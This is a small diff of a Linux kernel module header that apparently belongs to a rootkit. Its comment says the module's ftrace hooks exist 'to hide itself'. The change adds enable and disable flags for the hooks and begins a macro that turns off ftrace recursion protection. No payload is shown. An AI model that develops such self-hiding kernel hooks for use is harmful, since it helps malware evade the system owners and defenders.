@@ -2,13 +2,13 @@
 #define HOOK_H
 
 #include <linux/ftrace.h>
-// #include <linux/slab.h>
-// #include <linux/uaccess.h>
-// #include <linux/linkage.h>
 
 /* *
  * All hooks used by the module to hide itself are controlled from here.
  * */
+
+#define HOOKS_DISABLED 0
+#define HOOKS_ENABLED 1
 
 // Disables ftrace's builtin recursion prevension:
 #define OPS                                                                    \
